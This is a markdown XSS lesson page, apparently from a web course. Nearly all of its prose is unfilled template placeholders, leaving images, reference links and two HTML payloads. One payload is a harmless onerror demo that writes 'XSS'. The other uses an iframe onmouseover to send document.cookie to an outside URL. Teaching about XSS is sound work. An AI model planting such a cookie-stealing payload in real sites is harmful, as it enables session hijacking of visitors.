# ![ico-30 study] XSS

{{s0.p1}}
{{s0.p2}}

{{s0.p3}}
{{s0.p4}}

{{s0.p5}}
{{s0.p6}}
{{s0.p7}}
{{s0.p8}}

{{s0.p9}}

{{s0.p10}}

![](illustrations/xss-atack.png)

{{s0.p11}}

{{s0.p12}}

~~~html
&lt;IMG SRC="images/hack.png"
     onerror="document.write(String.fromCharCode(88, 83, 83))"/>
~~~

{{s0.p13}}

{{s0.p14}}

![](illustrations/xss-atack-cookie.png)

{{s0.p15}}

~~~html
&lt;IFRAME SRC=js/attack.html
  onmouseover="window.open('https://garevna.github.io/js-samples/js/attack.html#' + document.cookie, '_self')">
</IFRAME>
~~~

{{s0.p16}}

{{s0.p17}}

{{s0.p18}}


## ![ico-25 hw] {{common.c8}}

{{s1.p1}}

{{s1.p2}}

![](illustrations/xss-atack-breakpoints.png)

{{s1.p3}}

{{s1.p4}}

{{s1.p5}}

{{s1.p6}}

__________________________________________________________

[![ico-20 link] XSS](https://owasp.org/www-community/attacks/xss/)
[![ico-20 link] websitesecurity](https://www.acunetix.com/websitesecurity/cross-site-scripting/)
